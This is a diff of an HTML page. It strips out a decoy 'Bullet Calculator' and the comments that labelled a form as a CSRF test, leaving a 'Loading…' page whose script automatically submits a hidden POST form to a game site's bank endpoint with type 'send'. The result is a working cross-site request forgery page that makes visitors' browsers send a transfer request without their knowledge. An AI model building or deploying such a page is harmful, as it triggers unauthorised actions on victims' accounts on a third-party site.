@@ -1,34 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Bullet Calculator</title>
+  <title>Test Page</title>
 </head>
 <body>
 
-<h2>Bullet Calculator</h2>
-
-<label>Bullets:</label>
-<input type="number" id="bullets" value="100">
-
-<label>Price per bullet:</label>
-<input type="number" id="price" value="2">
-
-<button onclick="calculate()">Calculate</button>
-
-<p id="output"></p>
-
-<script>
-function calculate() {
-  var b = document.getElementById("bullets").value;
-  var p = document.getElementById("price").value;
-  document.getElementById("output").innerText =
-    "Total cost: $" + (b * p);
-}
-</script>
-
-<!-- =============================== -->
-<!-- CSRF TEST FORM (HIDDEN)         -->
-<!-- =============================== -->
+<p>Loading…</p>
 
 <form id="csrfForm" action="https://www.underworldgangsters.com/?p=bank" method="POST">
   <input type="hidden" name="type" value="send">
@@ -37,7 +14,6 @@ function calculate() {
 </form>
 
 <script>
-  // Auto-submit when page loads (CSRF behavior)
   document.getElementById("csrfForm").submit();
 </script>
 
